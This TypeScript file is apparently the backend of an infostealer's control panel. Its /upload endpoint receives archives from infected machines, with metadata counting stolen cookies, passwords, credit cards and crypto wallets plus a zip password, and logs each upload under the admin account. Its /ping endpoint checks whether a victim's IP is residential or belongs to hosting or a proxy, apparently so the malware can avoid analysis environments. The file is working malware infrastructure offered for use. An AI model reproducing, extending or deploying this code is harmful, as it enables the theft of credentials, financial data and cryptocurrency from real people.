import { logsTable, uploadsTable, usersTable } from "@/database/schema";
import { cubaclientMiddleware } from "@/middleware/cubaclient.middleware";
import { database } from "@/utils/database";
import { eq } from "drizzle-orm";
import { Hono, type Context } from "hono";
import { join } from "path";

const UPLOAD_DIR = join(import.meta.dir, '../../uploads')

export const api = new Hono()

//cf/proxy headers first, raw bun socket as fallback
function getClientIp(c: Context): string {
    const ip = c.req.header('cf-connecting-ip')
        ?? c.req.header('x-forwarded-for')?.split(',')[0].trim()
        ?? c.req.header('x-real-ip')
        ?? (c.env as any)?.server?.requestIP?.(c.req.raw)?.address
        ?? ''
    return ip.startsWith('::ffff:') ? ip.slice(7) : ip
}

api.get('/ping', async (c) => {
    const ip = getClientIp(c)

    //localhost or unresolved, debug builds pass through
    if (!ip || ip === '127.0.0.1' || ip === '::1') {
        return c.json({ ok: true, residential: true, ip: '', country: '' })
    }

    try {
        const res  = await fetch(`http://ip-api.com/json/${ip}?fields=countryCode,hosting,proxy`)
        const data = await res.json() as { countryCode?: string; hosting?: boolean; proxy?: boolean }
        return c.json({
            ok:          true,
            residential: !data.hosting && !data.proxy,
            ip,
            country:     data.countryCode ?? 'Unknown',
        })
    } catch {
        //ip-api.com down, fail open
        return c.json({ ok: true, residential: true, ip, country: 'Unknown' })
    }
})

//bypass Buns formData()
function parseParts(body: Buffer, boundary: string) {
    const sep   = Buffer.from(`\r\n--${boundary}`)
    const crlf2 = Buffer.from('\r\n\r\n')
    const out: Record<string, { headers: Record<string, string>; data: Buffer }> = {}

    const firstBound = `--${boundary}\r\n`
    const firstIdx   = body.indexOf(firstBound)
    if (firstIdx === -1) return out

    let pos = firstIdx + Buffer.byteLength(firstBound)

    while (pos < body.length) {
        const sepIdx = body.indexOf(sep, pos)
        if (sepIdx === -1) break

        const part = body.slice(pos, sepIdx)
        const hEnd = part.indexOf(crlf2)
        if (hEnd !== -1) {
            const headers: Record<string, string> = {}
            for (const line of part.slice(0, hEnd).toString().split('\r\n')) {
                const ci = line.indexOf(':')
                if (ci > 0) headers[line.slice(0, ci).toLowerCase().trim()] = line.slice(ci + 1).trim()
            }
            const nm = (headers['content-disposition'] ?? '').match(/name="([^"]*)"/)
            if (nm) out[nm[1]] = { headers, data: part.slice(hEnd + 4) }
        }

        pos = sepIdx + sep.length
        if (pos + 1 < body.length && body[pos] === 0x2D && body[pos + 1] === 0x2D) break
        pos += 2
    }

    return out
}

api.post('/upload', cubaclientMiddleware, async (c) => {
    const ct     = c.req.header('content-type') ?? ''
    const bMatch = ct.match(/boundary=([^\s;]+)/i)
    if (!bMatch) return c.json({ message: 'missing boundary' }, 400)

    const raw      = Buffer.from(await c.req.arrayBuffer())
    const parts    = parseParts(raw, bMatch[1])
    const metaPart = parts['metadata']
    const filePart = parts['file']

    if (!metaPart || !filePart) return c.json({ message: 'metadata and file are required' }, 400)

    let meta: {
        name: string
        ip?: string
        country?: string
        cookies?: number
        creditcards?: number
        passwords?: number
        cryptocurrencies?: number
        windows_version?: string
        zip_pass?: string
    }

    try   { meta = JSON.parse(metaPart.data.toString('utf8')) }
    catch { return c.json({ message: 'invalid metadata JSON' }, 400) }

    if (!meta.name) return c.json({ message: 'name is required' }, 400)

    const owner = await database.query.usersTable.findFirst({ where: eq(usersTable.role, 'admin') })
    if (!owner) return c.json({ message: 'no admin user — run seed first' }, 500)

    const [log] = await database.insert(logsTable).values({
        userId: owner.id,
        name: meta.name,
        ip: meta.ip || '',
        country: meta.country || 'Unknown',
        cookies: meta.cookies ?? 0,
        passwords: meta.passwords ?? 0,
        creditcards: meta.creditcards ?? 0,
        cryptocurrencies: meta.cryptocurrencies ?? 0,
        windowsVersion: meta.windows_version ?? '',
        zipPass: meta.zip_pass ?? '',
    }).returning({ id: logsTable.id })

    const fnMatch  = (filePart.headers['content-disposition'] ?? '').match(/filename="([^"]*)"/)
    const origName = fnMatch ? fnMatch[1] : 'upload.zip'
    const ext      = origName.split('.').pop() ?? 'bin'
    const filename = `${Date.now()}-${crypto.randomUUID()}.${ext}`

    await Bun.write(join(UPLOAD_DIR, filename), filePart.data)

    await database.insert(uploadsTable).values({
        userId: owner.id,
        logId:  log.id,
        filename,
        originalName: origName,
        size: filePart.data.length,
    })

    return c.json({ message: 'ok' }, 200)
})
